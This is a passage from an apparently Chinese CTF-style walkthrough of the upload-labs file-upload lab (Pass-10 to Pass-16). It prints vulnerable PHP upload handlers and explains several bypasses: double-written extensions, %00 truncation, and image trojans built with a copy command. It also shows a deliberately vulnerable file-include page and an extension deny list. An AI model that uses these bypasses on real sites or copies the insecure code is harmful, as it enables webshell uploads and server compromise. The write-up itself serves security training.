class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_name = str_ireplace($deny_ext,<span class="hljs-string">&quot;&quot;</span>, $file_name);<br>        $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$file_name;        <br>        <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;<br>            $is_upload = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">1234567891011121314151617181920</span><br></code></pre></td></tr></table></figure><p>黑名单过滤，将黑名单里的后缀名替换为空且只替换一次，因此可以用双写绕过<br><img src="https://img-blog.csdnimg.cn/20190619082922259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619083032640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-11-00截断"><a href="#Pass-11-00截断" class="headerlink" title="Pass-11-00截断"></a>Pass-11-00截断</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    $file_ext = substr($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;<br>        $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        $img_path = $_GET[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_ext;<br><br>        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;<br>            $is_upload = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        $msg = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">12345678910111213141516171819</span><br></code></pre></td></tr></table></figure><p>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">$img_path = $_GET[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_ext;<br>截断条件：php版本小于<span class="hljs-number">5.3</span><span class="hljs-number">.4</span>，php的magic_quotes_gpc为OFF状态<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019061908535953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619085428879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12-00截断"></a>Pass-12-00截断</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    $file_ext = substr($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;<br>        $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        $img_path = $_POST[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_ext;<br><br>        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;<br>            $is_upload = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传失败&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">12345678910111213141516171819</span><br></code></pre></td></tr></table></figure><p>save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。<br><img src="https://img-blog.csdnimg.cn/2019061909071992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2019061909081330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619090907698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-13-图片马绕过"><a href="#Pass-13-图片马绕过" class="headerlink" title="Pass-13-图片马绕过"></a>Pass-13-图片马绕过</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params">$filename</span>)</span>&#123;<br>    $file = fopen($filename, <span class="hljs-string">&quot;rb&quot;</span>);<br>    $bin = fread($file, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span><br>    fclose($file);<br>    $strInfo = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, $bin);    <br>    $typeCode = intval($strInfo[<span class="hljs-string">&#x27;chars1&#x27;</span>].$strInfo[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    <br>    $fileType = <span class="hljs-string">&#x27;&#x27;</span>;    <br>    <span class="hljs-keyword">switch</span>($typeCode)&#123;      <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            <br>            $fileType = <span class="hljs-string">&#x27;jpg&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            <br>            $fileType = <span class="hljs-string">&#x27;png&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;        <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            <br>            $fileType = <span class="hljs-string">&#x27;gif&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:            <br>            $fileType = <span class="hljs-string">&#x27;unknown&#x27;</span>;<br>        &#125;    <br>        <span class="hljs-keyword">return</span> $fileType;<br>&#125;<br><br>$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    $file_type = getReailFileType($temp_file);<br><br>    <span class="hljs-keyword">if</span>($file_type == <span class="hljs-string">&#x27;unknown&#x27;</span>)&#123;<br>        $msg = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        $img_path = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_type;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;<br>            $is_upload = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">1234567891011121314151617181920212223242526272829303132333435363738394041</span><br></code></pre></td></tr></table></figure><p>通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作图片马：</p><blockquote><p>copy 22.jpg /b + 1.php /a shell.jpg</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190619092253865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">##include.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="hljs-comment">*/</span><br>header(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br>$file = $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($file))&#123;<br>    <span class="hljs-keyword">include</span> $file;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    show_source(<span class="hljs-keyword">__file__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><span class="hljs-number">123456789101112</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190619092621502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-14-getimagesize-图片马"><a href="#Pass-14-getimagesize-图片马" class="headerlink" title="Pass-14-getimagesize()-图片马"></a>Pass-14-getimagesize()-图片马</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params">$filename</span>)</span>&#123;<br>    $types = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(file_exists($filename))&#123;<br>        $info = getimagesize($filename);<br>        $ext = image_type_to_extension($info[<span class="hljs-number">2</span>]);<br>        <span class="hljs-keyword">if</span>(stripos($types,$ext)&gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> $ext;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br>$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    $res = isImage($temp_file);<br>    <span class="hljs-keyword">if</span>(!$res)&#123;<br>        $msg = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        $img_path = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).$res;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;<br>            $is_upload = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">1234567891011121314151617181920212223242526272829303132</span><br></code></pre></td></tr></table></figure><p>这题是用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass-13<br><img src="https://img-blog.csdnimg.cn/20190619094339987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-15-exif-imagetype-图片马"><a href="#Pass-15-exif-imagetype-图片马" class="headerlink" title="Pass-15-exif_imagetype()-图片马"></a>Pass-15-exif_imagetype()-图片马</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params">$filename</span>)</span>&#123;<br>    <span class="hljs-comment">//需要开启php_exif模块</span><br>    $image_type = exif_imagetype($filename);<br>    <span class="hljs-keyword">switch</span> ($image_type) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;    <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br>$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    $res = isImage($temp_file);<br>    <span class="hljs-keyword">if</span>(!$res)&#123;<br>        $msg = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        $img_path = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$res;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;<br>            $is_upload = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536</span><br></code></pre></td></tr></table></figure><p>这里用到php_exif模块来判断文件类型，用图片马绕过，方法同pass-13<br><img src="https://img-blog.csdnimg.cn/20190619095026297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Pass-16-二次渲染绕过"><a href="#Pass-16-二次渲染绕过" class="headerlink" title="Pass-16-二次渲染绕过"></a>Pass-16-二次渲染绕过</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br>    $filename = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    $filetype = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    $tmpname = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    $target_path=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.basename($filename);<br><br>    <span class="hljs-comment">// 获得上传文件的扩展名</span><br>    $fileext= substr(strrchr($filename,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span><br>    <span class="hljs-keyword">if</span>(($fileext == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            $im = imagecreatefromjpeg($target_path);<br><br>            <span class="hljs-keyword">if</span>($im == <span class="hljs-literal">false</span>)&#123;<br>                $msg = <span class="hljs-string">&quot;该文件不是jpg格式的图片！&quot;</span>;<br>                @unlink($target_path);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                srand(time());<br>                $newfilename = strval(rand()).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$newfilename;<br>                imagejpeg($im,$img_path);<br>                @unlink($target_path);<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(($fileext == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            $im = imagecreatefrompng($target_path);<br><br>            <span class="hljs-keyword">if</span>($im == <span class="hljs-literal">false</span>)&#123;<br>                $msg = <span class="hljs-string">&quot;该文件不是png格式的图片！&quot;</span>;<br>                @unlink($target_path);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                 <span class="hljs-comment">//给新图片指定文件名</span><br>                srand(time());<br>                $newfilename = strval(rand()).<span class="hljs-string">&quot;.png&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                $img_path = UPLOAD_PATH.<span 